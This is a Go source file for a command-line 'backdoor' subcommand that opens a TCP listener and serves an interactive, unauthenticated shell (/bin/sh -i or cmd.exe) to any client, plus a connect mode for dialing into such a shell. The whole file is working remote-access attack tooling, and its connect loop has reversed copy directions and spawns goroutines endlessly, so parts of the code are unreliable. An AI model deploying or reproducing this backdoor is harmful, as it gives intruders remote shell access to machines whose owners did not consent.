package cmd

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"syscall"
	"time"

	"github.com/spf13/pflag"
	"go.coder.com/cli"
	"go.coder.com/flog"
)

const tcp = "tcp"

var signals = []os.Signal{syscall.SIGHUP, syscall.SIGINT, syscall.SIGTERM, syscall.SIGQUIT}

type backDoorCmd struct {
	create, connect bool
	port            int
	address         string
}

// Spec returns a command spec containing a description of it's usage.
func (cmd *backDoorCmd) Spec() cli.CommandSpec {
	return cli.CommandSpec{
		Name:  "backdoor",
		Usage: "[flags]",
		Desc:  "Serve shell access over TCP and connect remotely.",
	}
}

// RegisterFlags initializes how a flag set is processed for a particular command.
func (cmd *backDoorCmd) RegisterFlags(fl *pflag.FlagSet) {
	fl.BoolVar(&cmd.create, "create", cmd.create, "Enable create mode. (must be used with the --port flag)")
	fl.BoolVar(&cmd.connect, "connect", cmd.connect, "Enable connect mode. (must be used with the --address flag)")
	fl.StringVarP(&cmd.address, "address", "a", cmd.address, "Address to connect to. (format: <host>:<port>)")
	fl.IntVarP(&cmd.port, "port", "p", cmd.port, "Port number to serve shell access on. (format: 80)")
}

// Run either creates a new TCP listener or connects to an existing one.
// This launches a shell session for the given GOOS.
func (cmd *backDoorCmd) Run(fl *pflag.FlagSet) {
	var err error

	switch {
	case cmd.create:
		err = create(cmd.port)
	case cmd.connect:
		err = connect(cmd.address)
	default:
		fl.Usage()
	}

	if err != nil {
		flog.Error("errors running backdoor : %v", err)
		fl.Usage()
	}
}

func create(port int) error {
	if port < 1 || port > TotalPorts {
		return fmt.Errorf("%d is an invalid port", port)
	}
	cmd, err := getSysCmd()
	if err != nil {
		return err
	}

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, signals...)
	connChan := make(chan net.Conn, 1)

	flog.Info("starting listener on :%d", port)

	lsnr, err := net.Listen(tcp, fmt.Sprintf(":%d", port))
	if err != nil {
		return err
	}

	flog.Success("now serving shell access on :%d", port)
	flog.Info("ready for inbound connections")

	go func() {
		conn, err := lsnr.Accept()
		if err != nil {
			flog.Error("failed to establish connection : %v", err)
			return
		}
		flog.Success("%s has connected", conn.RemoteAddr().String())
		connChan <- conn
	}()

	for {
		select {
		case signal := <-stop:
			flog.Info("received %s signal", signal)
			close(connChan)
			for conn := range connChan {
				conn.Close()
			}
			return nil
		case conn := <-connChan:
			go handle(cmd, conn)
		default:
			time.Sleep(time.Millisecond * 250)
			continue
		}
	}
}

func connect(address string) error {
	if address == "" {
		return fmt.Errorf("missing address")
	}

	flog.Info("dialing %s", address)

	conn, err := net.Dial(tcp, address)
	if err != nil {
		return err
	}

	flog.Success("connection established")
	flog.Info("starting shell session")

	c := make(chan os.Signal, 1)
	signal.Notify(c, signals...)

	go func() {
		defer conn.Close()
		for {
			sig := <-c
			flog.Info("received %v signal", sig)
			return
		}
	}()

	for {
		go io.Copy(conn, os.Stdout)
		io.Copy(os.Stdin, conn)
	}
}

func handle(cmd *exec.Cmd, conn net.Conn) {
	defer conn.Close()
	r, w := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = w
	go io.Copy(conn, r)
	cmd.Run()
}

func getSysCmd() (*exec.Cmd, error) {
	var err error
	switch runtime.GOOS {
	case "windows":
		return exec.Command("cmd.exe"), nil
	case "darwin", "linux":
		return exec.Command("/bin/sh", "-i"), nil
	default:
		err = fmt.Errorf("os %s not supported", runtime.GOOS)
	}
	return nil, err
}
